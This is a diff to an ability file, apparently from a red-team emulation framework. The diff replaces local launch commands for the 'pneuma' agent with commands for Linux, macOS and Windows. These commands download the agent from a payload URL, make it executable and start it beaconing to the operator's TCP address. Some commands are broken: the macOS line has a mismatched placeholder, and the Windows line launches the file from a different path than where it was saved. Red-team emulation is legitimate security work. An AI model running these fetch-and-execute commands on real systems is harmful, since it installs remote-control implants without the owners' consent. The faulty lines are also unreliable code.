@@ -2,7 +2,8 @@ id: 5f9001dc-e179-451f-bbd1-9fb4466d7057
 metadata:
   authors:
   - privateducky
-  tags: []
+  tags:
+    - agent
   chains:
   - JXA access
   release_date: 2021-08-25
@@ -21,14 +22,22 @@ technique:
 platforms:
   linux:
     sh:
-      command: nohup ./pneuma-linux >/dev/null 2>&1 &
+      command: |
+        curl #{payload.url} > /tmp/pneuma && 
+        chmod +x /tmp/pneuma && 
+        nohup /tmp/pneuma -name $(echo $HOSTNAME) -address #{operator.tcp} &
       payload: pneuma-linux
   darwin:
     sh:
-      command: nohup ./pneuma-darwin -address "#{operator.http}" -contact http >/dev/null
-        2>&1 &
+      command: |
+        curl #{payload.url) > /tmp/pneuma && 
+        chmod +x /tmp/pneuma && 
+        nohup /tmp/pneuma -name $(echo $HOSTNAME) -address #{operator.tcp} &
       payload: pneuma-darwin
   windows:
     psh:
-      command: Start-Process .\pneuma-windows.exe
+      command: |
+        $wc = New-Object System.Net.WebClient; 
+        $wc.DownloadFile("#{payload.url}","C:\aws\download\pneuma-windows.exe"); 
+        Start-Process -FilePath .\pneuma-windows.exe -ArgumentList "-name $env:COMPUTERNAME -address #{operator.tcp}"
       payload: pneuma-windows.exe
